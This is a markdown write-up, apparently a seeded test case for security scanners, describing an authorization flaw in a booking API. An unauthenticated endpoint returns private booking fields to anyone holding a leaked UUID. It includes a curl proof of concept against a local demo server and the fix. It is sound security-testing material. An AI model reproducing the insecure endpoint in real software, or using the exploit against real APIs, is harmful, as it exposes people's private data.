# `bola/uuid-slug-skip` — UUID-as-capability

## The bug

`GET /api/v1/bookings/by-uuid/{public_uuid}/details` returns the **host-side** booking
schema (with `notes`, `invitee_email`, `host_id`) without authenticating the caller.
The endpoint reuses the same `load_booking_by_uuid()` helper as the legitimate public
invitee endpoint, but returns more fields. The implicit assumption: "the UUID is
unguessable, only the booking parties have it."

## Why static analysis misses it

The data path is identical to a known-safe public endpoint. Only the response schema
differs. Detecting this requires understanding that UUIDs are **not** capabilities — they
leak via ICS exports, server logs, calendar shares, browser referrer headers, and email
forwarding. Conventional SAST has no notion of "this field is sensitive only when leaked
out-of-band." AI SAST may also miss it because the function looks like a legitimate
admin lookup.

## PoC

(server running at 127.0.0.1:8000; seed_data.py has been run)

```bash
# Carol logs in and lists her bookings to grab a UUID
CAROL_TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"carol@initech.test","password":"demo1234"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['access_token'])")
VICTIM_UUID=$(curl -s http://127.0.0.1:8000/api/v1/bookings/mine \
  -H "Authorization: Bearer $CAROL_TOKEN" \
  | python -c "import sys, json; print(json.load(sys.stdin)[0]['public_uuid'])")
echo "Carol's booking UUID: $VICTIM_UUID"

# Suppose Eve obtains this UUID (leaked ICS file, email forward, log scrape).
# She is unauthenticated and not in Initech.
curl -s "http://127.0.0.1:8000/api/v1/bookings/by-uuid/$VICTIM_UUID/details"
```

Expected (vulnerable): full host-side response including
`"notes":"VIP customer renewal — DO NOT LEAK"` and `"invitee_email":"vip@example.com"`.

On `main`, this endpoint does not exist — the request returns `404`.

## Fix

Add `current_user: User = Depends(get_current_user)` and require
`booking.host_id == current_user.id`. UUIDs in URLs should never be treated as
authorization tokens.
